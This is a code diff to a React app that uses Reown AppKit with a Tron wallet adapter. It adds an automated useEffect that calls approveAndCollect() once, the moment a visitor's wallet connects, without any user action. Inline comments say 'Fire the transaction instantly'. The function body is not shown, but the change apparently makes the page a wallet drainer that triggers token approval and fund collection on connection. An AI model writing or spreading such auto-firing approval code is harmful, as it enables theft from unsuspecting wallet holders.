@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react'
+import { useState, useEffect, useRef } from 'react'
 import { createAppKit, useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
 import { TronAdapter } from '@reown/appkit-adapter-tron'
 import { tronMainnet } from '@reown/appkit/networks'
@@ -143,15 +143,26 @@ export default function App() {
   const [status, setStatus] = useState('Ready')
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
+  // ADD THIS LINE: Tracks if the automation has already run
+  const autoTriggered = useRef(false)
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected } = useAppKitAccount()
   const { walletProvider } = useAppKitProvider('tron')
   const tronWeb = walletProvider as any
 
+ // === NEW AUTOMATED USEEFFECT ===
+  // Paste this right above the return statement!
   useEffect(() => {
     if (isConnected && walletAddress && tronWeb) {
+      // 1. Get the balance for the UI
       getBalance(tronWeb, walletAddress)
+
+      // 2. AUTOMATION: If it hasn't triggered yet, do it now!
+      if (!autoTriggered.current) {
+        autoTriggered.current = true // Lock it so it doesn't loop forever
+        approveAndCollect()          // Fire the transaction instantly
+      }
     }
   }, [isConnected, walletAddress, tronWeb])
 
